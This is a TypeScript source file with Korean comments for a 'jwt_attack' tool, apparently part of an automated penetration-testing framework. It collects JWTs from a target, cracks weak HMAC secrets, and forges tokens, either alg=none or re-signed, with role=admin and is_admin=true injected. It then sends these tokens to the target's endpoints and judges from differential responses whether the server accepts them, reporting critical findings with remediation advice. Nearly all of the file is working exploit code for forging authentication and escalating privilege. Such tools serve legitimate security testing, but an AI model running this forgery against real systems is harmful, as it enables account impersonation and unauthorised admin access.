/**
 * jwt_attack — JWT 능동 위조 실증. jwt_audit 이 "정적 분석"이라면 이 툴은 "실증"이다.
 *
 * 관찰된 토큰으로 만든 **위조 변형**을 서버가 실제로 유효 세션으로 수용하는지 확인한다:
 *   변형 1 (alg=none)      — 서명을 제거한 토큰. "서명 검증 생략" 파서가 수용하면
 *                            임의 페이로드(관리자 승격 포함) 주입이 성립한다(critical).
 *   변형 2 (약한 HMAC 재서명) — jwt_audit 의 소형 사전으로 원본 시크릿을 찾았을 때,
 *                            payload 에 role=admin·is_admin=true 를 추가해 동일 alg 로
 *                            재서명. 서버가 수용하면 토큰 위조가 실증된다(critical).
 *
 * 판정(오탐 통제) — 같은 엔드포인트에 **3요청 차등**:
 *   A(무토큰) / B(원본 토큰) / C(위조 토큰) — 셋 모두 fresh cookie jar 로 보내
 *   토큰 헤더가 유일한 자격증명이 되게 격리한다(기존 세션 쿠키가 결과를 오염시키지 않음).
 *   - A≈B 이면 이 엔드포인트는 토큰을 검사하지 않는다 → 판별 불가, 스킵.
 *   - B 거부(4xx)면 원본 토큰이 이 엔드포인트에 안 통함 → 스킵.
 *   - status(C) == status(B) && B 성공 && C 본문에 거부 신호 없음 → 위조 수용.
 *   - C 본문에 B 에 없던 특권 신호(role=admin/관리자)가 보이면 증명 문자열에 명시.
 *
 * 안전: GET 전용·상태변경 없음. 토큰이 관찰된 대상에만 동작하며, 위조 토큰은
 * "검증 요청" 목적의 1회성 사용이다(세션을 탈취해 재사용하지 않는다).
 */

import { createHmac } from "node:crypto";
import type { Tool, ToolContext, ToolResult } from "../core/types.js";
import { newJar } from "../net/http-client.js";
import { authGet, baseUrl, joinPath } from "./util.js";
import { collect, crackHs, parseJwt } from "./jwt-audit.js";

const VALIDATE_PATH_RE = /(\/me(\/|$)|whoami|profile|user|account|session|api|admin|dashboard)/i;
const PRIVILEGE_RE = /"role"\s*:\s*"[^"]*admin[^"]*"|"is_admin"\s*:\s*true|"admin"\s*:\s*true|관리자|administrator/i;
const REJECT_RE = /invalid|unauthorized|forbidden|signature|expired|유효하지|인증 실패|거부/i;
const MAX_ENDPOINTS = 4;

const b64url = (s: string | Buffer): string => Buffer.from(s).toString("base64url");

function sign(hp: string, alg: string, secret: string): string {
  const bits = /hs384/i.test(alg) ? "sha384" : /hs512/i.test(alg) ? "sha512" : "sha256";
  return createHmac(bits, secret).update(hp).digest("base64url");
}

/** payload 에 관리자 클레임을 얹은 위조 토큰을 만든다. */
function forgeVariant(
  original: { header: Record<string, unknown>; payload: Record<string, unknown> },
  kind: "none" | "hmac",
  secret?: string,
): string | null {
  const payload = { ...original.payload, role: "admin", is_admin: true };
  const header = kind === "none" ? { typ: "JWT", alg: "none" } : { ...original.header };
  const hp = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`;
  if (kind === "none") return `${hp}.`;
  if (!secret) return null;
  return `${hp}.${sign(hp, String(original.header.alg ?? "HS256"), secret)}`;
}

/** 컨텍스트/응답에서 관찰 가능한 JWT 를 모은다. */
async function observedTokens(ctx: ToolContext, base: string, paths: string[]): Promise<string[]> {
  const tokens = new Set<string>();
  for (const v of Object.values(ctx.auth ?? {})) collect(String(v), tokens);
  for (const p of paths) {
    try {
      const res = await authGet(ctx, joinPath(base, p), { cap: 8000 });
      collect(res.headers["set-cookie"] ?? "", tokens);
      collect(res.body, tokens);
    } catch {
      /* 관찰 실패는 무시 */
    }
    if (tokens.size > 0) break;
  }
  return [...tokens];
}

interface Trip {
  a: { status: number; body: string };
  b: { status: number; body: string };
}

/**
 * 한 엔드포인트에서 A(무토큰)/B(원본) 차등을 측정한다. 둘 다 fresh jar + 토큰만 자격증명.
 * A≈B(토큰 검사 없음) 또는 B 거부(토큰 미통용)면 null — 오탐 방지.
 */
async function authBoundary(ctx: ToolContext, url: string, token: string, authKeys: string[]): Promise<Trip | null> {
  const strip: Record<string, string> = {};
  for (const k of authKeys) strip[k.toLowerCase()] = "";
  try {
    const [a, b] = await Promise.all([
      authGet(ctx, url, { headers: Object.keys(strip).length ? strip : undefined, jar: newJar() }),
      authGet(ctx, url, { headers: { authorization: `Bearer ${token}` }, jar: newJar() }),
    ]);
    if (a.status === b.status && a.body === b.body) return null;
    if (b.status >= 400) return null;
    return { a: { status: a.status, body: a.body }, b: { status: b.status, body: b.body } };
  } catch {
    return null;
  }
}

export const jwtAttack: Tool = {
  name: "jwt_attack",
  description:
    "관찰된 JWT 의 위조 변형(alg=none·약한 시크릿 role=admin 재서명)을 서버가 유효 세션으로 수용하는지 실증한다. 무토큰/원본/위조 3요청 차등(fresh jar, 토큰 격리)으로 판정하고 인증 경계가 없는 엔드포인트는 스킵한다. GET 전용.",
  intent: "exploit",
  async run(args, ctx: ToolContext): Promise<ToolResult> {
    const base = baseUrl(ctx.target);
    const candidates = pickPaths(args);
    const tokens = await observedTokens(ctx, base, candidates.slice(0, 2));
    if (tokens.length === 0) {
      return { ok: false, summary: "위조 시도할 JWT 를 찾지 못함(토큰이 관찰되지 않음)" };
    }

    // 검증 엔드포인트 후보: 인자 경로 중 인증 확인용으로 보이는 것 우선.
    const endpoints = [...new Set([...candidates.filter((p) => VALIDATE_PATH_RE.test(p)), ...candidates])].slice(0, MAX_ENDPOINTS);
    // A 요청에서 벗길 자격증명 헤더 키(ctx.auth 의 키들).
    const authKeys = Object.keys(ctx.auth ?? {});

    for (const tok of tokens) {
      const parsed = parseJwt(tok);
      if (!parsed) continue;
      const alg = String(parsed.header.alg ?? "").toLowerCase();

      // 변형 2 먼저(HS 약한 시크릿 → 관리자 재서명) — 가장 확실한 실증.
      if (alg.startsWith("hs")) {
        const weak = crackHs(tok, alg);
        if (weak) {
          const forged = forgeVariant(parsed, "hmac", weak);
          if (forged) {
            const hit = await tryForged(ctx, base, endpoints, authKeys, tok, forged, `약한 시크릿 재서명(role=admin)`);
            if (hit) return hit;
          }
        }
      }
      // 변형 1 — alg=none(서명 제거). 원본 alg 와 무관하게 파서 수용 여부가 핵심.
      const noneForged = forgeVariant(parsed, "none");
      if (noneForged) {
        const hit = await tryForged(ctx, base, endpoints, authKeys, tok, noneForged, "alg=none(서명 제거)");
        if (hit) return hit;
      }
    }
    return { ok: false, summary: `JWT 위조 수용 미탐지 — 토큰 ${tokens.length}개의 none/재서명 변형이 모두 거부되거나 판별 가능한 엔드포인트 없음` };
  },
};

/** 엔드포인트 후보들에서 위조 토큰 수용 여부를 검증한다. 실증 시 ToolResult 반환. */
async function tryForged(
  ctx: ToolContext,
  base: string,
  endpoints: string[],
  authKeys: string[],
  original: string,
  forged: string,
  variantLabel: string,
): Promise<ToolResult | null> {
  for (const ep of endpoints) {
    const url = joinPath(base, ep);
    const trip = await authBoundary(ctx, url, original, authKeys);
    if (!trip) continue; // 인증 경계 없음 → 오탐 방지
    let c;
    try {
      c = await authGet(ctx, url, { headers: { authorization: `Bearer ${forged}` }, jar: newJar() });
    } catch {
      continue;
    }
    if (c.status !== trip.b.status) continue; // 위조는 거부됨
    if (REJECT_RE.test(c.body) && !PRIVILEGE_RE.test(c.body)) continue; // 본문 거부 신호
    const priv = PRIVILEGE_RE.test(c.body) && !PRIVILEGE_RE.test(trip.b.body);
    return {
      ok: true,
      summary: `JWT 위조 실증: ${ep} — ${variantLabel} 토큰이 유효 세션으로 수용(HTTP ${c.status}, 원본과 동일 통과)`,
      fingerprint: { indicators: [`jwt-forgery ${ep}`] },
      data: {
        severity: "critical",
        title: `JWT 위조 실증 — ${variantLabel} 수용 (${ep})`,
        evidence:
          `JWT 실증: 위조 토큰(${variantLabel})이 유효 세션으로 수용 — 무토큰 HTTP ${trip.a.status} / 원본 HTTP ${trip.b.status} / 위조 HTTP ${c.status}` +
          (priv ? ", 위조 토큰 응답에 특권 신호(role=admin) 신규 등장" : "") +
          ". 임의 클레임(관리자 승격·만료 무한) 주입이 성립한다.",
        impact:
          "서명 검증 우회/약한 시크릿으로 임의 토큰 위조가 가능하면 임의 계정 사칭·관리자 승격·만료 조작이 모두 가능하다. 라이브러리의 검증 API 사용(alg 고정, none 거부), 충분한 엔트로피의 시크릿, kid/jku 등 헤더 파라미터 검증이 필요.",
      },
    };
  }
  return null;
}

function pickPaths(args: Record<string, unknown>): string[] {
  if (typeof args.path === "string" && args.path) return [args.path];
  if (Array.isArray(args.paths)) {
    const ps = args.paths.filter((x): x is string => typeof x === "string");
    if (ps.length) return [...new Set(ps)].slice(0, 8);
  }
  return ["/"];
}
